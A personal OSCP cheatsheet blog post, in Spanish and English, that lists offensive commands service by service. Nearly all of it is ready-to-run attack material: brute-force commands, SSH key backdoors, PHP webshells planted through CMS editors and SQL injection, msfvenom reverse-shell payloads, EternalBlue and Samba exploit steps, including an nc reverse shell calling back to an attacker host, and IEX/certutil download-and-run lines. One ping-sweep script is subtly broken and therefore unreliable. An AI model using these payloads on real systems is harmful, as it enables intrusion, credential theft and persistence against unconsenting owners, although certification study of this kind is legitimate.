---
image:
  path: ../../images/oscp.png
  width: 800
  height: 500
title: OSCP Cheatsheet
date: 2022-12-12
layout: post
categories: [OSCP, cheatsheet]
tags:  [OSCP] 
pin: true
img_path: /images
---

Bienvenidos a mi Cheatsheet personal para la certificación de la OSCP


## Protocolos
### FTP -> 21
FTP (File Transfer Protocol) es un protocolo comunmente utilizado para la transferencia de archivos utiliza el puerto 21 para comando y control y el 20 para el transporte de datos

#### Descargar archivo

```shell
ftp <IP>
PASSIVE             // (OPCIONAL)
BINARY
get <FILE>
```

#### Subir un archivo

```shell
ftp <IP>
PASSIVE              // (OPCIONAL)
BINARY
put <FILE>
```

El comando BINARY es un modo usado comunmente para transferencia de archivos binarios

#### Fuerza Bruta

```shell
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

---

### SSH -> 22
SSH (Secure Shell) es un protocolo empleado para el acceso remoto a un servidor mediante una conexión cifrada, este tambien permite un sistema de keys.

#### Conexión Basica
```shell
ssh <USER>@<IP>
```

#### Keys
Dentro del directorio personal de cada usuario encontramos el directorio `~/.ssh/` si no está puede ser creado en SSH dentro podemos encontrar los siguientes contenidos:
```shell
id_rsa.pub      -> Esta sería la key publica
id_rsa          -> Y esta sería la privada

authorized_keys -> Este archivo contiene todas las keys publicas a las que se les 
                   permite el acceso remoto
```

#### Conexión id_rsa
Es importante saber que si poseemos de una key privada de algun usuario podríamos emplearla para conectarnos sin contraseña de la siguiente forma:

```shell
ssh -i id_rsa <USER>@<IP>
```

- (La id_rsa ha de tener privilegios 600 -> `chmod 600 id_rsa`)

#### Backdoor
Con `ssh-keygen` podemos generar una clave privada y publica de nuestro usuario
```shell
[+] Nuestra maquina:
	ssh-keygen
	cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip

[+] Maquina victima:
	echo "<contenido_id_rsa.pub>" >> ~/.ssh/authorized_keys
```

Y ya podriamos conectarnos con nuestra id_rsa privada generada de el comando ssh-keygen

#### Fuerza Bruta

```shell
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ssh://<IP> -u -vV
```

---

### DNS -> 53
Protocolo empleado en la resolución de direcciones a IPs

```shell
dnsenum <DOMAIN>
```

```shell
dnsrecon -d <DOMAIN>
```

#### Ataque de Zona de Transferencia

```shell
dnsrecon -d <DOMAIN> -a
dig axfr <DOMAIN> @ns1.test.com
```

#### Fuerza Bruta

```shell
https://github.com/blark/aiodnsbrute
```


---

### FINGER -> 73

#### Enumeración de Usuarios

```shell
finger @<IP>
finger <USER>@<IP>
```

#### Ejecución de comandos

```shell
finger "|/bin/id@<IP>"
finger "|/bin/ls -a /<IP>"
```


---

### HTTP & HTTPS -> 80, 443

#### Wordpress
Wordpress es un gestor de contenido web (CMS) comunmente empleado.
>El archivo mas importante a enumerar es: `wp-config.php` ya que este suele contener la contraseña y el usuario empleados para la base de datos de wordpress

##### WPSCAN

Herramienta para hacer un scan general de wordpress como encontrar plugins con vulnerabilidades o enumerar usuarios validos en wordpress

```shell
# Scan
wpscan --url <URL>

# Enumerar Usuarios(u) y vulnerabilidades de plugins(vp)
wpscan --url <URL> --enumerate u,vp

# Detectar plugins de forma mas agresiva (mejor con --api-token)
--pulings-detection aggressive

# Fuerza bruta a un usuario usando un diccionario
wpscan --url <URL> -U "<USER>" -P <PASSWORDS.txt>

```
(Podemos emplear wpseku como alternativa)

##### Wordpress a RCE (admin requerido)

Obtener `Ejecución remota de comandos` (RCE) estando previamente autenticado como admin en wordpress

```shell
Modificamos el php del tema usado (Credenciales de admin Requeridas)

Appearance -> Editor -> 404 Template (at the right)
Cambiamos el contenido a una php shell

# Aquí un ejemplo de shell y de como llamarla
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://<IP>/wp-content/themes/twentytwelve/404.php
```


#### Drupal

```shell
droopescan scan -u <URL>
```

##### Enumeración de usuarios

```shell
In /user/register just try to create a username and if the name is already taken it will be notified :
*The name admin is already taken*

If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/<number> you can see the number of existing users :
	- /user/1 -> Access denied (user exist)
	- /user/2 -> Page not found (user doesn't exist)
```

##### Enumeración de paginas ocultas

```shell
Fuzz /node/<NUMBER> where <NUMBER> is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 <URL>/node/FUZZ
```

##### Drupal a RCE

```shell
You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -> (Check) PHP Filter  -> Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
```

#### Joomla

```shell
joomscan -u <URL>
./joomlavs.rb --url <URL> -a -v
```

#### Tomcat

##### Credenciales por defecto

```shell
The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are:

admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

##### Fuerza bruta 

```shell
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV -u
```

##### Tomcat a RCE

```shell
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Upload payload
Tomcat6 :
wget 'http://<USER>:<PASSWORD>@<IP>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener
nc -lvp <PORT>

# Execute payload
curl http://<IP>:8080/shell/
```

#### WebDav

```shell
davtest -url <URL>
```


#### Spidering / Brute force directories / files

```shell
gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>

ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/FUZZ -e .php,.txt -t <THREADS>
dirbuster

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#### File backups

Once you have found all the files, look for backups of all the executable files ("*.php*", "*.aspx*"...). Common variations for naming a backup are 

```shell
file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
```

#### Local File Inclusion / Remote File Inclusion - LFI / RFI

```shell
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
```

#### Wrappers

##### Wrapper php://filter

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
```

##### Wrapper expect://

```
http://example.com/index.php?page=expect://id
```

##### Wrapper data://

```
echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
	- exec
	- shell_exec
	- system
	- passthru
	- popen

# Exemple
echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
```

##### Wrapper input://

```
curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
```

#### Command injection

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection]()


#### Deserialization

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization]()

#### File upload

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%]()

#### SQL injection

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection]()
- [https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli]()

Si sanitizan el nombre de la tabla o de la base de datos podriamos pasarlo a hexadecimal
```shell
tr -d '\n' | xxd -ps y el output 0x"$output"
```

Si es por url hay que usar -- - o # urlencoded, tambien podemos hacer sqli mediante burpsuite

```sql
Distintos payloads serian:
tom' or '1'='1'

tom'-- -

tom'#

admin')#
```

```
ERROR BASED:

$data' 
# si nos muestra un error significa que podriamos injectar querys a sql

$data' union select 1-- -

$data' union select schema_name from information_schema.schemata-- - 
# detectar bases de datos

$data' union select table_name from information_schema.tables where table_schema="$basedatos"-- - 
# enumerar tablas de la base de datos

$data' union select column_name from information_schema.columns where table_schema="$basedatos" and table_name="$tabla"-- -

$data' union select group_concat($columna1,0x3a,$columna2) from $tabla-- - 
# en este caso solo se usa 1 campo para 2 columnas

# si $tabla está en otra base de datos: $basedatos.$tabla

$data' union select "algo" into outfile "/var/www/html/prueba.txt"-- - 
# probamos a acceder a ip/prueba.txt

$data' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- - 
# para ver si podemos escribir en un fichero
# a lo mejor pudiendo subir codigo php para que lo interprete

' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
# para ver las sentencias que podemos hacer

LOAD_FILE('alsdjfl'); 
# podemos listar contenido de la web para ver como
# funciona el php y incluso sacar psswd y user de db
```

#### XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)


#### Otras vulnerabilidades web


-  [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)



---

### Kerberos -> 88

- [https://www.tarlogic.com/en/blog/how-to-attack-kerberos/](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

---

### POP3 -> 110

#### Fuerza bruta

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

#### Leer un correo

```
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT
```

---

### NTP -> 123/udp

`NTP (Network Time Protocol)` es un protocolo de Internet para sincronizar los relojes de los sistemas informáticos

Existen distintas herramientas para conectarte con ntp y sincronizar tu hora

---

### SNMP -> 161/udp

#### Fuerza bruta de la community string

```
onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
```

```
snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> <IP>
```

```
snmp-check <IP>
```

#### Modifying SNMP values

- [http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html]()


---

### LDAP -> 389

#### Scans

```
nmap -n -sV --script "ldap* and not brute"

ldapsearch -h <IP> -x -s base
ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

#### Interfaz Grafica

```
jxplorer
```

---

### SMB -> 445

#### Version if nmap didn't detect it

```
Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <IP>
```

#### Scan for vulnerability

```
nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>
```

If :

- MS17-010 - [EternalBlue](#EternalBlue (MS17-010))
- MS08-067 - [MS08-067](#MS08-067)
- CVE-2017-7494 - [CVE-2017-7494](#CVE-2017-7494)

#### Manual testing

```
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R

crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares

enum4linux -a <IP>

smbclient --no-pass -L //$IP
smbclient //<IP>/<SHARE>

# Download all files from a directory recursively
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
```

#### Brute force

```
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```

#### Mount a SMB share

```
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share

smbclient //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER>
```

#### Get a shell

```
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```

#### EternalBlue (MS17-010)

```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

##### Check if vulnerable

```
python eternal_checker.py <IP>
```

##### Prepare shellcodes and listeners

```
cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh
```

##### Exploit

```
python eternalblue_exploit<NUMBER>.py <IP> shellcode/sc_all.bin

May need to run it multiple times
```

##### If this doesn't work, try this one

```
python zzz_exploit.py <IP>
```

#### MS08-067

```
# Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp <PORT>

# Exploit
python ms08_067_2018.py <IP> <NUMBER> 445
```

#### CVE-2017-7494

```
# Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494
```

Create a new file named poc.c :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("ping -c 3 <IP>");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start an ICMP listener
sudo tcpdump -i <INTERFACE> icmp

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :

```
#include <stdio.h>
#include <stdlib.h>

int samba_init_module(void)
{
	setresuid(0,0,0);
	system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f");
}
```

```
# Build
gcc -o test.so -shared poc.c -fPIC
```

```
# Start a listener
nc -lvp <PORT>

# Exploit
./cve_2017_7494.py -t <TARGET_IP> -u <USER> -P <PASSWORD> --custom=test.so
```

---

### MSSQL -> 1433

#### Get information

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

```
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
mssqlclient.py <USER>:<PASSWORD>@<IP>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
```

#### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mssql-injection-cheat-sheet/
```

---

### NFS -> 2049

Tambien podemos consultar en hacktricks

#### Show Mountable NFS Shares

```
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
```

#### Mount a share

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
```

#### NFS misconfigurations

```
# List exported shares
cat /etc/exports
```

If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.

```
# Attacker, as root user

mkdir <DIRECTORY>
mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
cd <DIRECTORY>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd <SHARE>
./pwn # Root shell
```

---

### MYSQL -> 3306

#### Fuerza bruta

```
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
```

#### Extracting MySQL credentials from files

```
cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

#### Conectarte

```
# Local
mysql -u <USER>
mysql -u <USER> -p

# Remote
mysql -h <IP> -u <USER>
```

#### MySQL comandos

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

#### Manual exploit

```
Cheatsheet :
	- https://www.asafety.fr/mysql-injection-cheat-sheet/
```

---

### RDP -> 3389

#### Fuerza bruta

```
crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>

hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
```

#### Conectarte con contraseña o hashes

```
rdesktop -u <USERNAME> <IP>
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>

xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
```

#### Session stealing

##### Get openned sessions

```
query user
```

##### Access to the selected 

```
tscon <ID> /dest:<SESSIONNAME>
```

#### Adding user to RDP group (Windows) 

```
net localgroup "Remote Desktop Users" <USER> /add
```

---

### VNC  -> 5800, 58001, 5900, 59001

#### Escaneo

``` 
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
```

#### Fuerza bruta

```
hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
```

#### Conectarte

```
vncviewer <IP>:<PORT>
```

#### Found VNC password

##### Linux

```
Default password is stored in: ~/.vnc/passwd
```

##### Windows

```
# RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini
```

#### Decrypt VNC password

```
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul
```

---

### WINRM -> 5985, 5986

#### Fuerza bruta

```
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
```

#### Conectarte

```
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
```

---

## Tansferencia de archivos

### Linux

Estas son distintas formas de transferir archivos entre maquinas linux

```shell
# INICIANDO UN SERVIDOR WEB CON PYTHON
sudo python -m SimpleHTTPServer <PORT> # Opción 1
sudo python -m http.server <PORT> # Opción 2

# FTP
sudo python3 -m pyftpdlib  -p 21 -w

# INICIANDO UN SERVIDOR SMB
sudo impacket-smbserver smbFolder $(pwd) -smb2support

# WGET
wget <URL> -o <OUT_FILE>

# CURL
curl <URL> -o <OUT_FILE>

# NETCAT
nc -lvp 443 > <OUT_FILE> # Victima
nc <IP> 443 < <IN_FILE>  # Atacante

# SCP
scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
scp -P 2222 -i id_rsa pspy www-data@10.10.10.246:/tmp/pspy # Ejemplo
```

---

### Windows

```powershell
# FTP 
echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
powershell "wget <URL>"

# Python
python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"

# CertUtil
certutil.exe -urlcache -split -f "<URL>"

# NETCAT
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>

# CURL
curl <URL> -o <OUT_FILE>
```

---

### Escalada de Privilegios

### Linux

#### Enumeración con Scripts

```shell
# Hay un repositorio en github con la utilidad linpeas la cual nos reportará
# información y posibles vectores de ataque
./linpeas.sh

# Contamos con pspy que es un repositorio de una utilidad en python que nos permite
# ver que comandos suceden en el sistema con privilegios, ideal para intentar un
# path hijacking
pspy.py
```

#### Enumerar permisos

```shell
# Tratamos de listar aquellos archivos suid
find / -perm -4000 2>/dev/null 

# Listamos capabilites de las que poder abusar en el sistema
getcap -r / 2>/dev/null

```

#### Methodology to follow

```shell
# En caso de que haya un gestor de contenidos
# o una web con sql y php buscar credenciales en
# config.php o el que corresponda ubicado en la raiz
# de la web

# Ver si podemos leer claves privadas ssh de algún usuario
# o podemos añadir nuestra clave publica al authorized_keys

# Ver si podemos ejecutar algo con sudo
sudo -l

# Ver si hay algun archivo raro en el home de algun usuario
# tambien comprobar el .bash_history (los archivos ocultos
# empiezan por . y para verlos usamos ls -la)

# Reutilizar credenciales encontradas en los usuarios y servicios

# Enumerar permisos SUID GUID Y CAPABILITIES

# Ver si podemos modificar el /etc/password

# Buscar en /etc archivos que contengan cadenas relevantes
# como el nombre de nuestro usuario
grep -Ri "wh1texnd" /etc 2>/dev/null

# Listar puertos abiertos para encontrar los que no están expuesto
# para hacer port forwarding
netstat -nat


# Si estamos en un docker
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
```


## Scripts en BASH

### Enumeración de Red

#### Enumeración de hosts usando ping

```shell
#!/bin/bash

for host in $(seq 1 254); do
	timeout 1 bash -c "ping -c 1 10.0.0.$i &>/dev/null" && echo "[*] Host 10.0.0.$i - Active" &
done; wait
```

#### Enumeracion de multiples redes usando ping

```shell
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo ...\n" 
    exit 1; tput cnorm
}

#Ctrl + C
trap ctrl_c INT

networks=(172.18.0 172.19.0)

tput civis; for network in ${networks[@]};do
    echo "[+] Enumerando Network: $network"
    for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 $network$i &>/dev/null" && echo -e "\t[*] Host $network$i - ACTIVE" &
    done; wait
done;tput cnorm
```


#### Escaneo de puertos para multiples hosts

```shell
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo ...\n" 
    exit 1; tput cnorm
}

#Ctrl + C
trap ctrl_c INT

hosts=(172.20.0.2 172.20.0.1 172.20.0.3)

tput civis; for host in ${hosts[@]};do
    echo "[+] Enumerando puertos del $host:"
    for i in $(seq 1 10000); do
        timeout 1 bash -c "echo '' > /dev/tcp/$host/$i" 2>/dev/null && echo -e "\t[*] Port $i - OPEN" &
    done; wait
done;tput cnorm
```

---

### Monitorización de Procesos

Podemos emplear el siguiente script en bash:
```shell
#!/bin/bash

old_process=$(ps -eo user,command)

while true;do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "command|diff|kworker"
	old_process=$new_process
done
```

> Podemos tambien hacer uso de la utilidad pspy:
> [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

---

## Scripts en Python

### TOTP empleando NTP

`TOTP` es un algoritmo que permite generar una contraseña de un solo uso que utiliza la hora actual como fuente de singularidad, cambiando así cada varios minutos. [NTP](#NTP)

```python
#!/usr/bin/python3
import pyotp
import ntplib

client=ntplib.NTPClient()
response=client.request("10.10.10.246")

totp = pyotp.TOTP("orxxi4c7orxwwzlo")

print("EL TOKEN es -> %s" % totp.at(response.tx_time))

```

---
